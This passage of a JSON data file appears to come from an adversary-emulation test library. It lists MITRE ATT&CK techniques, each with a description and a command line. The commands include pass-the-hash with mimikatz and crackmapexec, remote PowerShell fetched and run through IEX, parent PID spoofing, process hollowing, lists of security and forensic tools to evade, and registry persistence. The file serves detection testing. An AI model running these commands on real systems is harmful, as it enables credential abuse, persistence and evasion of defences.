         "command": "cat /etc/passwd |grep nobody ; chsh --shell /bin/bash nobody; usermod --password $(openssl passwd -1 nobody) nobody; su nobody; whoami; exit"
      }
   ],
   "T1550.002": [
      {
         "technique_id": "T1550.002",
         "technique_name": "Use Alternate Authentication Material: Pass the Hash",
         "tactic": "multiple",
         "description": "command execute with crackmapexec\n",
         "command": "C:\\CrackMapExecWin\\crackmapexec.exe %userdnsdomain% -u Administrator -H cc36cf7a8514893efccd3324464tkg1a -x whoami"
      },
      {
         "technique_id": "T1550.002",
         "technique_name": "Use Alternate Authentication Material: Pass the Hash",
         "tactic": "multiple",
         "description": "Note: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)\n",
         "command": "%tmp%\\mimikatz\\x64\\mimikatz.exe \"sekurlsa::pth /user:Administrator /domain:%userdnsdomain% /ntlm:cc36cf7a8514893efccd3324464tkg1a\""
      },
      {
         "technique_id": "T1550.002",
         "technique_name": "Use Alternate Authentication Material: Pass the Hash",
         "tactic": "multiple",
         "description": "Use Invoke-WMIExec to Pass the Hash\nNote: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target $env:COMPUTERNAME -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname"
      }
   ],
   "T1134.004": [
      {
         "technique_id": "T1134.004",
         "technique_name": "Access Token Manipulation: Parent PID Spoofing",
         "tactic": "multiple",
         "description": "Spawns a powershell.exe process as a child of the current process.",
         "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -CommandLine '-Command Start-Sleep 10' -ParentId $PID"
      },
      {
         "technique_id": "T1134.004",
         "technique_name": "Access Token Manipulation: Parent PID Spoofing",
         "tactic": "multiple",
         "description": "Spawns a notepad.exe process as a child of the current process.",
         "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Start-ATHProcessUnderSpecificParent  -ParentId $PID -TestGuid 12345678-1234-1234-1234-123456789123"
      },
      {
         "technique_id": "T1134.004",
         "technique_name": "Access Token Manipulation: Parent PID Spoofing",
         "tactic": "multiple",
         "description": "Creates a notepad.exe process and then spawns a powershell.exe process as a child of it.",
         "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Start-Process -FilePath $Env:windir\\System32\\notepad.exe -PassThru | Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -CommandLine '-Command Start-Sleep 10'"
      },
      {
         "technique_id": "T1134.004",
         "technique_name": "Access Token Manipulation: Parent PID Spoofing",
         "tactic": "multiple",
         "description": "This test uses PowerShell to replicates how Cobalt Strike does ppid spoofing and masquerade a spawned process.\nUpon execution, \"Process C:\\Program Files\\Internet Explorer\\iexplore.exe is spawned with pid ####\" will be displayed and\ncalc.exe will be launched.\n\nCredit to In Ming Loh (https://github.com/countercept/ppid-spoofing/blob/master/PPID-Spoof.ps1)\n",
         "command": ". \"C:\\Users\\puma-4\\Desktop\\PPID-Spoof.ps1\"; $ppid=Get-Process explorer | select -expand id; PPID-Spoof -ppid $ppid -spawnto \"C:\\Program Files\\Internet Explorer\\iexplore.exe\" -dllpath \"8b38ee_calc.dll\""
      },
      {
         "technique_id": "T1134.004",
         "technique_name": "Access Token Manipulation: Parent PID Spoofing",
         "tactic": "multiple",
         "description": "Spawnd a process as a child of the first accessible svchost.exe process.",
         "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine, ProcessId -Filter \"Name = 'svchost.exe' AND CommandLine LIKE '%'\" | Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -CommandLine '-Command Start-Sleep 10'"
      }
   ],
   "T1078.004": [
      {
         "technique_id": "T1078.004",
         "technique_name": "Valid Accounts: Cloud Accounts",
         "tactic": "multiple",
         "description": "This atomic will create a new IAM role. The default role permissions are: *IAM Service Account Get*. The idea for this Atomic came from a Rule published by the Elastic team.\n\nIdentifies an Identity and Access Management (IAM) custom role creation in Google Cloud Platform (GCP). \nCustom roles are user-defined, and allow for the bundling of one or more supported permissions to meet specific needs. \nCustom roles will not be updated automatically and could lead to privilege creep if not carefully scrutinized.\n\nThis atomic will create a new IAM role. The default role permissions are: *IAM Service Account Get*\n\nReference: https://github.com/elastic/detection-rules/blob/main/rules/integrations/gcp/initial_access_gcp_iam_custom_role_creation.toml\n",
         "command": "gcloud config set project atomic-test-1; gcloud iam roles create AtomicRedTeamRole --description=\"Atomic Red Team Custom IAM Role\" --permissions=iam.serviceAccounts.get --project=atomic-test-1"
      },
      {
         "technique_id": "T1078.004",
         "technique_name": "Valid Accounts: Cloud Accounts",
         "tactic": "multiple",
         "description": "GCP Service Accounts can be used to gain intial access as well as maintain persistence inside Google Cloud.\n",
         "command": "gcloud config set project art-project-1; gcloud iam service-accounts create gcp-art-service-account-1; gcloud iam service-accounts keys create gcp-art-service-account-1.json --iam-account=gcp-art-service-account-1@art-project-1.iam.gserviceaccount.com"
      },
      {
         "technique_id": "T1078.004",
         "technique_name": "Valid Accounts: Cloud Accounts",
         "tactic": "multiple",
         "description": "Identifies when an Azure Automation runbook is created or modified. An adversary may create or modify an Azure\nAutomation runbook to execute malicious code and maintain persistence in their target's environment.\n",
         "command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd; Connect-AzAccount -Credential $creds; New-AzAutomationRunbook -Name"
      }
   ],
   "T1497.001": [
      {
         "technique_id": "T1497.001",
         "technique_name": "Virtualization/Sandbox Evasion: System Checks",
         "tactic": "multiple",
         "description": "Windows Management Instrumentation(WMI) objects contain system information which helps to detect virtualization. This test will get the model and manufacturer of the machine to determine if it is a virtual machine, such as through VMware or VirtualBox. \n",
         "command": "$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Manufacturer\"; $Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Model\"; if((($Manufacturer.ToLower() -eq \"microsoft corporation\") -and ($Model.ToLower().contains(\"virtual\"))) -or ($Manufacturer.ToLower().contains(\"vmware\")) -or ($Model.ToLower() -eq \"virtualbox\")) {write-host \"Virtualization environment detected!\"} else {write-host \"No virtualization environment detected!\"}"
      },
      {
         "technique_id": "T1497.001",
         "technique_name": "Virtualization/Sandbox Evasion: System Checks",
         "tactic": "multiple",
         "description": "Windows Management Instrumentation(WMI) objects contains system information which helps to detect virtualization. This command will specifically attempt to get the CurrentTemperature value from this object and will check to see if the attempt results in an error that contains the word supported. This is meant to find the result of Not supported, which is the result if run in a virtual machine\n",
         "command": "$error.clear(); Get-WmiObject -Query \"SELECT * FROM MSAcpi_ThermalZoneTemperature\" -ErrorAction SilentlyContinue; if($error) {echo \"Virtualization Environment detected\"}"
      },
      {
         "technique_id": "T1497.001",
         "technique_name": "Virtualization/Sandbox Evasion: System Checks",
         "tactic": "multiple",
         "description": "ioreg contains registry entries for all the device drivers in the system. If it's a virtual machine, one of the device manufacturer will be a Virtualization Software.\n",
         "command": "if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi; "
      },
      {
         "technique_id": "T1497.001",
         "technique_name": "Virtualization/Sandbox Evasion: System Checks",
         "tactic": "multiple",
         "description": "systemd-detect-virt detects execution in a virtualized environment.\nAt boot, dmesg stores a log if a hypervisor is detected.\n",
         "command": "if (systemd-detect-virt) then echo \"Virtualization Environment detected\"; fi; if (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo \"Virtualization Environment detected\"; fi; "
      },
      {
         "technique_id": "T1497.001",
         "technique_name": "Virtualization/Sandbox Evasion: System Checks",
         "tactic": "discovery",
         "description": "Determine if the system is virtualized or physical",
         "command": "get-wmiobject win32_computersystem | fl model\n"
      },
      {
         "technique_id": "T1497.001",
         "technique_name": "Virtualization/Sandbox Evasion: System Checks",
         "tactic": "defense-evasion",
         "description": "Check for security services. Security service list is based on the SUNBURST malware observed in a Solarwinds related compromise (https://research.checkpoint.com/2020/sunburst-teardrop-and-the-netsec-new-normal/).",
         "command": "$securityServices = @(\n    \"msmpeng\",\n    \"windefend\",\n    \"mssense\",\n    \"sense\",\n    \"microsoft.tri.sensor\",\n    \"microsoft.tri.sensor.updater\",\n    \"cavp\",\n    \"cb\",\n    \"carbonblack\",\n    \"carbonblackk\",\n    \"cbcomms\",\n    \"cbstream\",\n    \"csfalconservice\",\n    \"csfalconcontainer\",\n    \"csagent\",\n    \"csdevicecontrol\",\n    \"csfalconservice\",\n    \"xagt\",\n    \"xagtnotif\",\n    \"fe_avk\",\n    \"fekern\",\n    \"feelam\",\n    \"fewscservice\",\n    \"ekrn\",\n    \"eguiproxy\",\n    \"egui\",\n    \"eamonm\",\n    \"eelam\",\n    \"ehdrv\",\n    \"ekrnepfw\",\n    \"epfwwfp\",\n    \"ekbdflt\",\n    \"epfw\",\n    \"fsgk32st\",\n    \"fswebuid\",\n    \"fsgk32\",\n    \"fsma32\",\n    \"fssm32\",\n    \"fnrb32\",\n    \"fsaua\",\n    \"fsorsp\",\n    \"fsav32\",\n    \"f-secure gatekeeper handler starter\",\n    \"f-secure network request broker\",\n    \"f-secure webui daemon\",\n    \"fsma\",\n    \"fsorspclient\",\n    \"f-secure gatekeeper\",\n    \"f-secure hips\",\n    \"fsbts\",\n    \"fsni\",\n    \"fsvista\",\n    \"f-secure filter\",\n    \"f-secure recognizer\",\n    \"fses\",\n    \"fsfw\",\n    \"fsdfw\",\n    \"fsms\",\n    \"fsdevcon\"\n);\n\n$currentServices = Get-Service | Select-Object -Property Name;\nforeach ($svc in $currentServices) {\n    foreach ($secSvc in $securityServices) {\n        if ($svc.Name -like $secSvc) {\n            $svcDetails = Get-Service -name $svc.Name | Select-Object -Property Name, DisplayName, Status;\n            Write-Host \"[!] Security service found:\";\n            Write-Host \"    Service Name:`t\", $svcDetails.Name;\n            Write-Host \"    Display Name:`t\", $svcDetails.DisplayName;\n            Write-Host \"    Status:`t`t\", $svcDetails.Status;\n            Write-Host \"\";\n        }\n    }\n}\n"
      },
      {
         "technique_id": "T1497.001",
         "technique_name": "Virtualization/Sandbox Evasion: System Checks",
         "tactic": "defense-evasion",
         "description": "Check for analysis/sandbox environment processes. Process black list is based on the SUNBURST malware observed in a Solarwinds related compromise (https://research.checkpoint.com/2020/sunburst-teardrop-and-the-netsec-new-normal/).",
         "command": "$forensicProcesses = @(\n    \"apimonitor-x64\",\n    \"apimonitor-x86\",\n    \"autopsy64\",\n    \"autopsy\",\n    \"autoruns64\",\n    \"autoruns\",\n    \"autorunsc64\",\n    \"autorunsc\",\n    \"binaryninja\",\n    \"blacklight\",\n    \"cff explorer\",\n    \"cutter\",\n    \"de4dot\",\n    \"debugview\",\n    \"diskmon\",\n    \"dnsd\",\n    \"dnspy\",\n    \"dotpeek32\",\n    \"dotpeek64\",\n    \"dumpcap\",\n    \"evidence center\",\n    \"exeinfope\",\n    \"fakedns\",\n    \"fakenet\",\n    \"ffdec\",\n    \"fiddler\",\n    \"fileinsight\",\n    \"floss\",\n    \"gdb\",\n    \"hiew32demo\",\n    \"hiew32\",\n    \"hollows_hunter\",\n    \"idaq64\",\n    \"idaq\",\n    \"idr\",\n    \"ildasm\",\n    \"ilspy\",\n    \"jd-gui\",\n    \"lordpe\",\n    \"officemalscanner\",\n    \"ollydbg\",\n    \"pdfstreamdumper\",\n    \"pe-bear\",\n    \"pebrowse64\",\n    \"peid\",\n    \"pe-sieve32\",\n    \"pe-sieve64\",\n    \"pestudio\",\n    \"peview\",\n    \"ppee\",\n    \"procdump64\",\n    \"procdump\",\n    \"processhacker\",\n    \"procexp64\",\n    \"procexp\",\n    \"procmon\",\n    \"prodiscoverbasic\",\n    \"py2exedecompiler\",\n    \"r2agent\",\n    \"rabin2\",\n    \"radare2\",\n    \"ramcapture64\",\n    \"ramcapture\",\n    \"reflector\",\n    \"regmon\",\n    \"resourcehacker\",\n    \"retdec-ar-extractor\",\n    \"retdec-bin2llvmir\",\n    \"retdec-bin2pat\",\n    \"retdec-config\",\n    \"retdec-fileinfo\",\n    \"retdec-getsig\",\n    \"retdec-idr2pat\",\n    \"retdec-llvmir2hll\",\n    \"retdec-macho-extractor\",\n    \"retdec-pat2yara\",\n    \"retdec-stacofin\",\n    \"retdec-unpacker\",\n    \"retdec-yarac\",\n    \"rundotnetdll\",\n    \"sbiesvc\",\n    \"scdbg\",\n    \"scylla_x64\",\n    \"scylla_x86\",\n    \"shellcode_launcher\",\n    \"solarwindsdiagnostics\",\n    \"sysmon64\",\n    \"sysmon\",\n    \"task explorer\",\n    \"task explorer-x64\",\n    \"tcpdump\",\n    \"tcpvcon\",\n    \"tcpview\",\n    \"vboxservice\",\n    \"win32_remote\",\n    \"win64_remotex64\",\n    \"windbg\",\n    \"windump\",\n    \"winhex64\",\n    \"winhex\",\n    \"winobj\",\n    \"wireshark\",\n    \"x32dbg\",\n    \"x64dbg\",\n    \"xwforensics64\",\n    \"xwforensics\",\n    \"redcloak\",\n    \"avgsvc\",\n    \"avgui\",\n    \"avgsvca\",\n    \"avgidsagent\",\n    \"avgsvcx\",\n    \"avgwdsvcx\",\n    \"avgadminclientservice\",\n    \"afwserv\",\n    \"avastui\",\n    \"avastsvc\",\n    \"aswidsagent\",\n    \"aswidsagenta\",\n    \"aswengsrv\",\n    \"avastavwrapper\",\n    \"bccavsvc\",\n    \"psanhost\",\n    \"psuaservice\",\n    \"psuamain\",\n    \"avp\",\n    \"avpui\",\n    \"ksde\",\n    \"ksdeui\",\n    \"tanium\",\n    \"taniumclient\",\n    \"taniumdetectengine\",\n    \"taniumendpointindex\",\n    \"taniumtracecli\",\n    \"taniumtracewebsocketclient64\"\n);\n\nfunction Find-ForensicProcesses {\n    param (\n        $ForensicProcessList\n    );\n    $CurrentProcesses = Get-Process | Sort-Object | Select-Object -Property Name | Get-Unique -AsString;\n    foreach ($proc in $CurrentProcesses) {\n        foreach ($forensicProc in $ForensicProcessList) {\n            if ($proc.name -like $forensicProc) {\n                $procPath = Get-Process -Name $proc.Name | Sort-Object | Select-Object -Property Path | Get-Unique;\n                Write-Host \"[!] Forensic process found: \" $proc.Name;\n                Write-Host \"[!] Path: \" $procPath.Path;\n            }\n        }\n    }\n}\n\nFind-ForensicProcesses($forensicProcesses);"
      }
   ],
   "T1055.012": [
      {
         "technique_id": "T1055.012",
         "technique_name": "Process Injection: Process Hollowing",
         "tactic": "multiple",
         "description": "This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.\nCredit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)\n",
         "command": ". \"C:\\Users\\puma-4\\Desktop\\Start-Hollow.ps1\"; $ppid=Get-Process explorer | select -expand id; Start-Hollow -Sponsor \"C:\\Windows\\System32\\notepad.exe\" -Hollow \"C:\\Windows\\System32\\cmd.exe\" -ParentPID $ppid -Verbose"
      },
      {
         "technique_id": "T1055.012",
         "technique_name": "Process Injection: Process Hollowing",
         "tactic": "multiple",
         "description": "This module executes notepad.exe from within the WINWORD.EXE process\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) ; Invoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"Word\" -sub \"Exploit\""
      }
   ],
   "T1547.001": [
      {
         "technique_id": "T1547.001",
         "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
         "tactic": "multiple",
         "description": "bat files can be placed in and executed from the startup folder to maintain persistance\n\nUpon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
         "command": "Copy-Item \"C:\\Users\\puma-4\\Desktop\\batstartup.bat\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"; Copy-Item \"C:\\Users\\puma-4\\Desktop\\batstartup.bat\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"; Start-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"; Start-Process \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\""
      },
      {
         "technique_id": "T1547.001",
         "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
         "tactic": "multiple",
         "description": "jse files can be placed in and ran from the startup folder to maintain persistance.\nUpon execution, \"T1547.001 Hello, World JSE!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
         "command": "Copy-Item \"C:\\Users\\puma-4\\Desktop\\jsestartup.jse\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"; Copy-Item \"C:\\Users\\puma-4\\Desktop\\jsestartup.jse\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"; cscript.exe /E:Jscript \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"; cscript.exe /E:Jscript \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\""
      },
      {
         "technique_id": "T1547.001",
         "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
         "tactic": "multiple",
         "description": "RunOnce Key Persistence via PowerShell\nUpon successful execution, a new entry will be added to the runonce item in the registry.\n",
         "command": "$RunOnceKey = \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"; set-itemproperty $RunOnceKey \"NextRun\" 'powershell.exe \"IEX (New-Object Net.WebClient).DownloadString(`\"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\")\"'"
      },
      {
         "technique_id": "T1547.001",
         "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
         "tactic": "multiple",
         "description": "secedit allows to manipulate the HKLM hive of the Windows registry. This test creates a Run key with the keyname calc having calc.exe as the value in the HKLM hive.\n[Reference](https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d)\n",
         "command": "secedit /import /db mytemplate.db /cfg \"035557_regtemplate.ini\" && secedit /configure /db mytemplate.db"
      },
      {
         "technique_id": "T1547.001",
         "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
         "tactic": "multiple",
         "description": "RunOnce Key Persistence.\n\nUpon successful execution, cmd.exe will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via stdout. \n",
         "command": "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\Path\\AtomicRedTeam.dll\""
      },
      {
         "technique_id": "T1547.001",
         "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
         "tactic": "multiple",
         "description": "This test will modify the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders -V \"Common Startup\" \nvalue to point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart\n",
         "command": "New-Item -ItemType Directory -path \"#{new_startup_folder}\"; Copy-Item -path \"#{payload}\" -destination \"#{new_startup_folder}\"; Set-ItemProperty -Path  \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Common Startup\" -Value \"#{new_startup_folder}\""
      },
      {
         "technique_id": "T1547.001",
         "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
         "tactic": "multiple",
         "description": "This test modifies the BootExecute registry value to \"autocheck autoche *\", which can be used to simulate an adversary's attempt to tamper with the system's boot process. \nReference - https://www.welivesecurity.com/wp-content/uploads/2018/09/ESET-LoJax.pdf\nNOTE that by not saving the correct value, you may inhibit your system from booting properly. Only run on a test system. There is a reg export before running the Atomic.\n",
         "command": "if (!(Test-Path \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\")) { reg.exe export \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\" /y }; Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" -Name \"BootExecute\" -Value \"autocheck autoche *\" -Type MultiString"
      },
      {
         "technique_id": "T1547.001",
         "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
         "tactic": "multiple",
         "description": "Add a persistance via Recycle bin [vxunderground](https://github.com/vxunderground/VXUG-Papers/blob/main/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf)\nUser have to clic on the recycle bin to lauch the payload (here calc)\n",
         "command": "reg ADD \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\" /ve /d \"calc.exe\" /f"
      },
      {
         "technique_id": "T1547.001",
         "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
         "tactic": "multiple",
         "description": "This test will create a HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run key value to launch calc.exe on boot. \n*Requires reboot\n",
         "command": "if (!(Test-Path -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\")){;   New-Item -ItemType Key -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"; }; Set-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\" -Value \"#{payload}\""
      },
      {
         "technique_id": "T1547.001",
         "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
         "tactic": "multiple",
         "description": "This test change the default value of HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell from \"explorer.exe\" to the full path of \"C:\\Windows\\explorer.exe\" \nto log a change to the key's default value without breaking boot sequence. \nAn atacker will alternatively replace this with a custom shell. \n",
         "command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\"); Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell-backup\" -Value \"$oldvalue\"; $newvalue = $oldvalue + \", #{payload}\"; Set-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\" -Value \"$newvalue\""
      },
      {
         "technique_id": "T1547.001",
         "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
         "tactic": "multiple",
         "description": "This test will modify the HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders  -V \"Startup\" value \nto point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart\n",
         "command": "New-Item -ItemType Directory -path \"#{new_startup_folder}\"; Copy-Item -path \"#{payload}\" -destination \"#{new_startup_folder}\"; Set-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Startup\" -Value \"#{new_startup_folder}\""
      },
      {
         "technique_id": "T1547.001",
         "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
         "tactic": "multiple",
         "description": "Run Key Persistence\n\nUpon successful execution, cmd.exe will modify the registry by adding \\\"Atomic Red Team\\\" to the Run key. Output will be via stdout. \n",
         "command": "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"C:\\Path\\AtomicRedTeam.exe\""
      },
      {
         "technique_id": "T1547.001",
         "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
         "tactic": "multiple",
         "description": "vbs files can be placed in and ran from the startup folder to maintain persistance. Upon execution, \"T1547.001 Hello, World VBS!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
         "command": "Copy-Item \"C:\\Users\\puma-4\\Desktop\\vbsstartup.vbs\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"; Copy-Item \"C:\\Users\\puma-4\\Desktop\\vbsstartup.vbs\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"; cscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"; cscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\""
      },
      {
         "technique_id": "T1547.001",
         "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
         "tactic": "multiple",
         "description": "This Atomic will create a registry key called socks5_powershell for persistance access\nhttps://medium.com/walmartglobaltech/systembc-powershell-version-68c9aad0f85c\n",
         "command": "$RunKey = \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"; Set-ItemProperty -Path $RunKey -Name \"socks5_powershell\" -Value \"powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File\""
      },
      {
         "technique_id": "T1547.001",
         "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
         "tactic": "multiple",
         "description": "Adds a non-malicious executable shortcut link to the current users startup directory. Test can be verified by going to the users startup directory and checking if the shortcut link exists. ",
         "command": "$Target = \"C:\\Windows\\System32\\calc.exe\"; $ShortcutLocation = \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\"; $WScriptShell = New-Object -ComObject WScript.Shell; $Create = $WScriptShell.CreateShortcut($ShortcutLocation); $Create.TargetPath = $Target; $Create.Save()"
      },
      {
         "technique_id": "T1547.001",
         "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
         "tactic": "multiple",
         "description": "This test will append a command to the  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit value to launch calc.exe on boot.\n* Requires reboot\n",
         "command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\"); Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit-backup\" -Value \"$oldvalue\"; $newvalue = $oldvalue + \" #{payload}\"; Set-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$newvalue\""
      },
      {
         "technique_id": "T1547.001",
         "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
         "tactic": "multiple",
         "description": "This test will create a new value under HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run to launch calc.exe on boot. \n*Requires reboot\n",
         "command": "if (!(Test-Path -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\")){;   New-Item -ItemType Key -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"; }; Set-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\" -Value \"#{payload}\""
      }
   ],
   "T1040": [
      {
         "technique_id": "T1040",
         "technique_name": "Network Sniffing",
         "tactic": "multiple",
         "description": "Opens a /dev/bpf file (O_RDONLY), sets BPF filter for 'udp' and captures packets for a few seconds.\n",
         "command": "sudo /tmp/t1040_macos_pcapdemo -f -i en0 -t 3"
      },
      {
         "technique_id": "T1040",
         "technique_name": "Network Sniffing",
         "tactic": "multiple",
